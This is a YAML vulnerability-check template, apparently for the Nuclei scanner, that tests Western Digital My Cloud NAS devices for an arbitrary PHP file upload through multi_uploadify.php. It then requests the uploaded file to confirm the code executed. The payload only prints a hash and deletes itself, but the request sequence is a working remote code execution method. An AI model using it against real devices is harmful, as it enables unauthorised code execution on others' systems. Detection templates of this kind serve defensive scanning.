id: western-digital-my-cloud-nas-file-upload
info:
  name: Western Digital My Cloud NAS Arbitrary File Upload Vulnerability
  author: ProjectDiscoveryAI
  severity: critical
  tags: file-upload,nas,western-digital
  description: |
    Western Digital My Cloud NAS devices are vulnerable to arbitrary file upload via the multi_uploadify.php endpoint, allowing an attacker to upload and execute PHP files.

variables:
  t1: "{{rand_int(1000, 10000)}}"
  t2: "{{md5(t1)}}"

http:
  - id: upload-file
    method: POST
    path:
      - "{{BaseURL}}/web/jquery/uploader/multi_uploadify.php?folder=/var/www/"
    headers:
      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundary"
    body: |
      ------WebKitFormBoundary
      Content-Disposition: form-data; name="Filedata[]"; filename="{{t1}}.php"
      Content-Type: application/octet-stream

      <?=md5({{t1}});unlink(__FILE__);
      ------WebKitFormBoundary--
    matchers:
      - type: status
        status:
          - 302
      - type: word
        words:
          - ""
        part: body

  - id: verify-upload
    method: GET
    path:
      - "{{BaseURL}}/{{t1}}.php"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "{{t2}}"
        part: body
